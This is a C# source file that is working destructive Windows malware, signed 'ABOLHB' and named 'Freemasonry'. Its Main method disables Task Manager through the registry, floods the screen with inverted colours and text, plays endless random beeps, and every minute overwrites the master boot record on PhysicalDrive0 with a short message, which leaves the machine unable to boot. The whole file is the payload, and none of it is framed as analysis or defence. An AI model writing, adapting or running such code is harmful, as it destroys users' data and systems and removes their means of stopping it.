/*
 * Copyright (c) 2024 ABOLHB
 * All Rights Reserved.
 * 
 * This software is provided "as-is", without any express or implied warranty. 
 * In no event shall the authors be held liable for any damages arising from the use 
 * of this software.
 */

using System;
using System.Drawing;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using Microsoft.Win32;

class Freemasonry
{
    [DllImport("user32.dll")]
    private static extern IntPtr GetWindowDC(IntPtr hWnd);

    [DllImport("user32.dll")]
    private static extern IntPtr GetDesktopWindow();

    [DllImport("user32.dll")]
    private static extern int GetSystemMetrics(int nIndex);

    [DllImport("gdi32.dll")]
    private static extern bool PatBlt(IntPtr hdc, int x, int y, int width, int height, uint rop);

    [DllImport("kernel32.dll")]
    private static extern IntPtr CreateFile(string lpFileName, uint dwDesiredAccess, uint dwShareMode,
        IntPtr lpSecurityAttributes, uint dwCreationDisposition, uint dwFlagsAndAttributes, IntPtr hTemplateFile);

    [DllImport("kernel32.dll")]
    private static extern bool WriteFile(IntPtr hfile, byte[] lpBuffer, uint nNumberOfBytesToWrite,
        out uint lpNumberBytesWritten, IntPtr lpOverlapped);

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern bool CloseHandle(IntPtr hObject);

    private const uint GenericAll = 0x10000000;
    private const uint FileShareRead = 0x1;
    private const uint FileShareWrite = 0x2;
    private const uint OpenExisting = 0x3;
    private const uint MbrSize = 512u;

    private const int SM_CXSCREEN = 0;
    private const int SM_CYSCREEN = 1;
    private const uint PATINVERT = 0x005A0049;

    private static void ContinuousBlurAndTextEffect()
    {
        Random rand = new Random();
        IntPtr hdc = GetWindowDC(GetDesktopWindow());
        int sx = GetSystemMetrics(SM_CXSCREEN);
        int sy = GetSystemMetrics(SM_CYSCREEN);

        using (Graphics g = Graphics.FromHdc(hdc))
        {
            Font font = new Font("Arial", 24, FontStyle.Bold, GraphicsUnit.Pixel);
            Brush brush = new SolidBrush(Color.Lime);

            while (true)
            {
                PatBlt(hdc, 0, 0, sx, sy, PATINVERT);
                string text = "ABOLHB";
                g.DrawString(text, font, brush, new PointF(rand.Next(sx - 200), rand.Next(sy - 50)));

                Thread.Sleep(10);
            }
        }
    }

    private static void PlayAnnoyingSound()
    {
        Random rand = new Random();

        while (true)
        {
            int frequency = rand.Next(200, 8000);
            int duration = rand.Next(100, 500);
            Console.Beep(frequency, duration);
        }
    }

    private static void WriteToMBR(string customText)
    {
        if (customText.Length > 446)
        {
            Console.WriteLine("Text too long. Must be less than 446 characters.");
            return;
        }

        byte[] mbrData = new byte[MbrSize];
        Array.Clear(mbrData, 0, mbrData.Length);

        byte[] textBytes = Encoding.ASCII.GetBytes(customText);
        Array.Copy(textBytes, mbrData, textBytes.Length);

        mbrData[510] = 0x55;
        mbrData[511] = 0xAA;

        IntPtr mbr = CreateFile("\\\\.\\PhysicalDrive0", GenericAll, FileShareRead | FileShareWrite, IntPtr.Zero,
            OpenExisting, 0, IntPtr.Zero);

        if (mbr != IntPtr.Zero)
        {
            WriteFile(mbr, mbrData, MbrSize, out uint lpNumberOfBytesWritten, IntPtr.Zero);
            CloseHandle(mbr);
        }
        else
        {
            Console.WriteLine("Failed to open MBR.");
        }
    }

    private static void DisableTaskManager()
    {
        try
        {
            using (RegistryKey key = Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System", true))
            {
                if (key == null)
                {
                    using (RegistryKey newKey = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System"))
                    {
                        if (newKey != null)
                        {
                            newKey.SetValue("DisableTaskMgr", 1, RegistryValueKind.DWord);
                            Console.WriteLine("Task Manager has been disabled.");
                        }
                        else
                        {
                            Console.WriteLine("Failed to create registry key.");
                        }
                    }
                }
                else
                {
                    key.SetValue("DisableTaskMgr", 1, RegistryValueKind.DWord);
                    Console.WriteLine("Task Manager has been disabled.");
                }
            }
        }
        catch (Exception ex)
        {
            Console.WriteLine("Error while disabling Task Manager: " + ex.Message);
        }
    }

    static void Main()
    {
        string textToWrite = "abolhb is here";
        DisableTaskManager();

        Thread blurThread = new Thread(ContinuousBlurAndTextEffect);
        blurThread.IsBackground = true;
        blurThread.Start();

        Thread soundThread = new Thread(PlayAnnoyingSound);
        soundThread.IsBackground = true;
        soundThread.Start();

        while (true)
        {
            WriteToMBR(textToWrite);
            Thread.Sleep(60000);
        }
    }
}
